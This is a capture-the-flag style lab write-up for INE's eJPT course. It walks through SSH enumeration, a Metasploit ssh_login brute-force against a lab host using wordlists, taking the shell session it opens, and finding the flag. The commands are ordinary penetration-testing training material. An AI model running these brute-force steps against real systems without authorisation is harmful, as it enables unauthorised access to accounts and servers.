# SSH Enumeration and Credential Attack (Metasploit) - INE eJPT

INE lab covering SSH service enumeration and credential brute force using Metasploit auxiliary modules against a Linux target. The objective is to confirm the SSH version, recover valid credentials with `ssh_login`, obtain an authenticated shell session, and retrieve the flag.

Target: `demo.ine.local`

---

## Enumeration

### Host and Service Discovery

```bash
ping -c 4 demo.ine.local
nmap -sS -sV demo.ine.local
```

SSH active on port 22.

### SSH Version Detection (Metasploit)

```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS demo.ine.local
exploit
```

Confirms the version from inside Metasploit before moving to the credential attack.

---

## Credential Attack

`ssh_login` tries each user and password combination from the wordlists directly against the SSH service, starting with Metasploit's small built-in lists before escalating to rockyou.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

Key parameters:
- `STOP_ON_SUCCESS true` - halts after the first valid credential pair, reducing noise and saving time
- `VERBOSE true` - displays each attempt for situational awareness during the attack

A session is opened automatically on success.

---

## Post-Exploitation

### Session Access

```bash
sessions
sessions -i 1
```

`sessions` lists what the module opened on success; `sessions -i 1` interacts with the first one, dropping into the authenticated shell on the target.

## Flag Retrieval

```bash
find / -name "flag"
cat /flag
```

---

## Key Takeaways

- Metasploit is an enumeration and scanning framework, not just an exploit loader. The `scanner/ssh` auxiliary modules handle version detection and credential testing without any CVE required.
- `STOP_ON_SUCCESS true` is important during exam conditions - unnecessary attempts after a valid credential is found add noise and consume time.
- SSH is rarely exploitable via CVE - weak or default credentials are the real attack surface.
- `ssh_login` opens a Metasploit session automatically on success - check `sessions` right after the module completes.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
